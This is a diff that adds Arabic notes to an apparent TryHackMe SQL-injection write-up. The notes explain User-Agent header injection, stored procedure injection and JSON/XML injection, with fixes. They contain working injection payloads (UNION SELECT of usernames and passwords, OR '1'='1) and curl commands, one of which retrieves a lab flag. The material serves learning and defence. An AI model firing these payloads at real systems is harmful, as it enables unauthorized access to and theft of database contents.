@@ -680,8 +680,170 @@ ls
 
 <details>
    <summary>GPT--explain</summary>
-  
+
+## 🧠 1. HTTP Header Injection (User-Agent Injection)
+
+### ✅ الفكرة العامة:
+
+بعض التطبيقات بتسجّل أو تستخدم بيانات الـ HTTP Headers (زي User-Agent, Referer, X-Forwarded-For) مباشرة في قواعد البيانات أو الاستعلامات بدون تعقيم، وده بيفتح الباب لـ SQL Injection.
+
+### 💥 مثال توضيحي:
+
+```http
+User-Agent: ' UNION SELECT username, password FROM user; #
+```
+
+إذا التطبيق بيستخدم القيمة دي في SQL query:
+
+```php
+$sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent';"
+```
+
+كده القيمة بتُدرج حرفيًا في الاستعلام، ولو فيها كود SQL هيتنفذ.
+
+### 📌 خطورة السيناريو:
+
+لو التطبيق بيعرض نتيجة هذا الاستعلام في صفحة (زي /httpagent/)، المهاجم يقدر يشوف البيانات اللي تم حقنها.
+
+### ⚖️ أدوات التنفيذ:
+
+* **Burp Suite** (لتعديل الهيدر بسهولة)
+* **curl**:
+
+```bash
+curl -H "User-Agent: ' UNION SELECT username, password FROM user; #" http://MACHINE_IP/httpagent/
+```
+
+---
+
+## 🧠 2. Stored Procedure Injection
+
+### ✅ الفكرة العامة:
+
+Stored Procedures هي دوال محفوظة داخل قاعدة البيانات. لو استخدمت إدخال المستخدم داخل Dynamic SQL، ممكن تؤدي لـ SQL Injection.
+
+### 💥 مثال توضيحي:
+
+```sql
+CREATE PROCEDURE sp_getUserData 
+    @username NVARCHAR(50)
+AS 
+BEGIN 
+    DECLARE @sql NVARCHAR(4000)
+    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
+    EXEC(@sql)
+END
+```
+
+لو مهاجم أرسل:
+
+```sql
+' OR '1'='1
+```
+
+هيتنفذ:
+
+```sql
+SELECT * FROM users WHERE username = '' OR '1'='1'
+```
+
+### ✅ الحل الأمني:
+
+استخدم Parameterized Queries:
+
+```sql
+CREATE PROCEDURE sp_getUserData
+    @username NVARCHAR(50)
+AS
+BEGIN
+    SELECT * FROM users WHERE username = @username
+END
+```
+
+---
+
+## 🧪 3. JSON / XML Injection
+
+### ✅ الفكرة العامة:
+
+لو التطبيق بيستقبل JSON أو XML، ويستخدم القيم في SQL بدون تعقيم، ممكن يحصل SQL Injection.
+
+### 📺 JSON Injection:
+
+#### ⭐ السيناريو:
+
+```json
+{
+  "username": "admin",
+  "password": "123456"
+}
+```
+
+المهاجم يرسل:
+
+```json
+{
+  "username": "admin' OR '1'='1--",
+  "password": "irrelevant"
+}
+```
+
+#### 💥 النتيجة:
+
+```sql
+SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = 'irrelevant'
+```
+
+### 📺 XML Injection:
+
+#### ⭐ السيناريو:
+
+```xml
+<user>
+  <username>admin' OR '1'='1</username>
+  <password>test</password>
+</user>
+```
+
+#### 💥 النتيجة:
+
+```sql
+SELECT * FROM users WHERE username = 'admin' OR '1'='1'
+```
+
+### ✅ الحل الأمني:
+
+* تعقيم كل المدخلات.
+* استخدم Prepared Statements.
+* استخدم مكتبات آمنة للتعامل مع JSON وXML.
+
+---
+
+## ✅ الخلاصة:
+
+| الهجوم                     | السبب                             | الحل                                 |
+| -------------------------- | --------------------------------- | ------------------------------------ |
+| HTTP Header Injection      | استخدام قيمة الهيدر مباشرة في SQL | استخدام تعقيم أو Prepared Statements |
+| Stored Procedure Injection | Dynamic SQL بدون باراميتر         | استخدام باراميتر داخل الـ Procedure  |
+| JSON / XML Injection       | بناء SQL من بيانات JSON/XML       | Prepared Statements وتعقيم القيم     |
+
+
 </details>
+
+
+- >
+  > ```
+  > curl -H "User-Agent: ' UNION SELECT flag,book_id FROM books; # " http://10.10.45.81/httpagent/
+  > ```
+  >
+  > found
+  >
+  > ```
+  > THM{HELLO}
+  > ```
+  >
+
+
 
 </details>
 
